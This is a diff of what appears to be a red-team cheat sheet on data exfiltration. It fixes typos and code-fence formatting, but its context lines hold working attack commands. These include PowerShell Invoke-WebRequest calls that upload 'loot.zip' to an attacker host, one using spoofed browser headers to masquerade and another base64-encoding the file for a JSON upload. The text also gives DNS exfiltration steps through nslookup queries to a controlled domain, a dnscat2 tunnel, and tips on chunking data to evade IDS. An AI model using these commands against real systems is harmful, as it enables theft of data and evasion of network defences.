@@ -113,12 +113,12 @@ Invoke-WebRequest -Uri https://attacker/upload -Method POST -Form @{file=Get-Ite
 ```
 
 Custom headers for masquerading
-```powershell
+```powershell{.wrap}
 Invoke-WebRequest https://attacker/upload  -Method POST -Headers @{ "User-Agent"="Mozilla/5.0"; "X-Requested-With"="XMLHttpRequest" } -InFile loot.zip
 ```
 
 JSON API Upload
-```powershell
+```powershell{.wrap}
 $body = @{ file = [Convert]::ToBase64String([IO.File]::ReadAllBytes("loot.zip")) } | ConvertTo-Json
 Invoke-WebRequest https://attacker/api/upload  -Method POST -ContentType "application/json"  -Body $body
 ```
@@ -157,8 +157,8 @@ DNS exfil via queries does not rely on a DNS response, but it does rely on DNS q
 
 In order for DNS exfiling to be possible you must first
 
-- **1** Control the domain you want to exfile. Example: `notaredteam.lol`
-- **2** You must control and monitor the authoritive DNS server for that domain. Meaning you must create a NS record for that domain.
+- **1** Control the domain you want to exfil. Example: `notaredteam.lol`
+- **2** You must control and monitor the authoritative DNS server for that domain, Meaning you must create a NS record for that domain.
 - **3** The target host must send DNS queries containing encoded data.
 
 What that looks like over the wire is thus:
@@ -168,13 +168,13 @@ When the target host runs something like
 nslookup -type=TXT QmFzZTY0.notaredteam.lol
 ```
 
-This causes, the resolver to first ask who has `QmFzZTY0.notaredteam.lol`.
+This causes the resolver to first ask who has `QmFzZTY0.notaredteam.lol`.
 
-The request then eventually reaches the authorittative DNS server for `notaredteam.lol`
+The request then eventually reaches the authoritative DNS server for `notaredteam.lol`
 
-Then on that authoratative server it will log `QmFzZTY0` as being requested.
+Then on that authoritative server it will log `QmFzZTY0` as being requested.
 
-For this attack to work the authoratative server **DOES NOT** need the record to exist. 
+For this attack to work the authoritative server **DOES NOT** need the record to exist. 
 
 The server should then reply with any of the following
 
@@ -182,10 +182,10 @@ The server should then reply with any of the following
 - empty TXT
 - random junk
 
-The response is irrelevant but is usful for disguising your attack. 
+The response is irrelevant but is useful for disguising your attack. 
 
 ### dnscat2
-dnscat is an interactive DNS tunnel with DNS encrpytion. Not avaiable on target host by default
+dnscat is an interactive DNS tunnel with DNS encrpytion. Not available on target host by default
 
 Start the server on Linux
 ```bash
@@ -213,7 +213,7 @@ while read line; do
 done < chunks.txt
 ```
 
-### Manaul DNS Exfil (Windows)
+### Manual DNS Exfil (Windows)
 **YOU MUST CHUNK YOUR FILES!**
 DNS packets are normally smaller so large parkets WILL alert an IDS or appropriately baselined Firewall. 
 ```powershell {.wrap}
